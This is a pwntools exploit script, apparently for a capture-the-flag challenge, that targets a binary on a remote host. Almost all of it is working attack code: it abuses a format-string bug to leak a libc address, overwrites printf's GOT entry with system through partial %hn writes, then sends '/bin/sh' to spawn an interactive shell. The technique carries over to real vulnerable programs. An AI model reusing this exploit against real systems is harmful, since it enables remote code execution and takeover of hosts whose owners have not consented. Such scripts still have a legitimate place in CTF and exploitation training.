#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.145.226.170 --port 2023 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.145.226.170'
port = int(args.PORT or 2023)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x00000000004012bc
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


libc = exe.libc

p = '%p-%19$p\n'
io.send(p)

data = io.recvline()[:-1].split("-")
leak_libc = int(data[1],16)
libc.address = leak_libc - libc.sym['__libc_start_main'] -234 -9
print hex(libc.address )

got_printf = exe.got['printf']
print hex(got_printf)
system = libc.sym['system']
print hex(system)
off = [system&0xffff,system>>16&0xff]
print hex(system&0xffff)
print hex(system>>16&0xff)

p = '%{}x%13$hn'.format(off[0])
p += '%{}x%14$hhn'.format(off[1]+(0x100-off[0]&0xff))
p = p.ljust(40,"a")
p += p64(got_printf)
p += p64(got_printf+2)

io.send(p)

io.recvuntil("a"*4)
p = '/bin/sh\x00'
io.send(p)

io.interactive()

